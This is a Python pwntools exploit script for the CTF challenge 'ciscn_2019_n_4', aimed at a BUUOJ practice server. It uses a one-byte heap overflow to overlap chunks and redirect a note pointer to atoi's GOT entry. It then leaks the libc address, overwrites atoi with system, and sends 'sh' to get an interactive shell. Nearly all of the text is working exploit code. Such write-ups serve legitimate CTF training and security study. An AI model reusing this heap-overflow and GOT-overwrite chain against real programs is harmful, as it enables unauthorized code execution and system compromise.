# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_n_4'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27999'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text = 'a'):
    cmd(1)
    sla('nest ?' , size)
    sa('in the nest?' , text)

def edit(idx , text):
    cmd(2)
    sla('Index :', idx)
    sa('in the nest?' , text)

def show(idx ):
    cmd(3)
    sla('Index :', idx)

def delete(idx ):
    cmd(4)
    sla('Index :', idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    # ptr_list = $rebase(0x0000000006020A0)
    atoi_got = elf.got['atoi']

    add(0x28)
    add(0x18)
    # delete(0)
    edit(0 , 'a'*0x28 + '\x41')
    delete(1)
    add(0x38 , flat(0,0,0,0x21,0x8,atoi_got))
    # 刚好data包含了结构体本身，可以直接修改结构体指针
    show(1)

    atoi_addr = l64()
    libc.address = atoi_addr - libc.sym['atoi']
    system_addr = libc.sym['system']

    edit(1 , p64(system_addr))

    cmd('sh\x00')

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_2019_n_4.py
@Time    :   2022/02/03 20:00:03
@Author  :   Niyah 
'''